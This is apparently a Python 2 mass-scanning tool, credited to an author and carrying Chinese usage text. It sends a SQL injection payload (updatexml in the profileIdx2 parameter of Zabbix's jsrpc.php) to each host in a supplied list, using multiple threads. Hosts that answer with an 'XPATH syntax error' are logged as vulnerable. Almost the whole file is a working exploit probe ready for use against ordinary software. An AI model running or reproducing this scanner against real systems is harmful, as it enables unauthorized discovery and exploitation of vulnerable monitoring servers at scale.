#coding=utf-8
import urllib2
import re
import sys
import threading
import Queue

payload=["/zabbix/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17",
		"/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"]
q=Queue.Queue()

class myThread (threading.Thread):
    def __init__(self,func,args1,args2):
        threading.Thread.__init__(self)
        self.func = func 
        self.args1 = args1
        self.args2 = args2
    def run(self):
        self.func(self.args1, self.args2)

def zabbix(url):
	url=urllib2.urlopen(url)
	urlt=url.read()
	return urlt

def main(q,f):
	while True:
		if not q.empty():
			try:
				urll=q.get().strip()
				print urll
				url_=zabbix(urll)
				urls=r"XPATH syntax error:"
				user=re.compile(urls)
				user_s=re.findall(user, url_)
				if user_s:
					f.write(urll+"[zabbix ok]"+"\n")
					print urll+"[zabbix ok]"+"\n"
				else:
					pass
			except:
				pass

if __name__ == '__main__':
	helps=u"""
			  zabbixscan扫描
				作者：沦沦
		使用：zabbixscan -m 线程数 -u url文件.txt 保存文件.txt
	"""
	if len(sys.argv)<2:
		print helps
	if len(sys.argv)>2:
		if sys.argv[1]=="-m" and sys.argv[3]=="-u":
			threads = []
			threadList = range(int(sys.argv[2]))
			url=open(sys.argv[4],'r')
			f=open(sys.argv[5],'w')
			for urllt in url:
				for payloads in payload:
					if urllt.strip():
						q.put("http://"+urllt.strip()+payloads)
			for i in threadList:
				t = myThread(main, q, f)
				t.setDaemon(True)
				threads.append(t)
				t.start()
			for t in threads:
				t.join()
		else:
			print helps
